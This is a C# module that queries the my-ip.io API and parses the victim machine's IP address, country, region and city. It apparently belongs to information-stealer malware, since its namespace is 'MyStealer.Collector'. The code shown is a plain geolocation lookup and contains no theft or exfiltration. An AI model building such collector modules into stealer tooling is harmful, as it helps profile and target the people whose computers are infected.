using Newtonsoft.Json.Linq;
using System;
using System.Net;

namespace MyStealer.Collector.Modules.Ip
{
    /// <summary>
    /// https://www.my-ip.io/api-usage
    /// </summary>
    public class MyIpIoProvider : ApiProviderBase
    {
        public override string ModuleName => "my-ip.io";

        public override Uri ApiUrl => new Uri("https://api.my-ip.io/v2/ip.json");

        public override IpDetails Parse(string response)
        {
            try
            {
                var obj = JObject.Parse(response);

                return new IpDetails
                {
                    Address = IPAddress.Parse(obj["ip"].Value<string>()),
                    CountryCode = obj["country"]["code"].Value<string>(),
                    RegionName = obj["region"].Value<string>(),
                    City = obj["city"].Value<string>()
                };
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error parsing api response.");
                return IpDetails.Empty;
            }
        }
    }
}
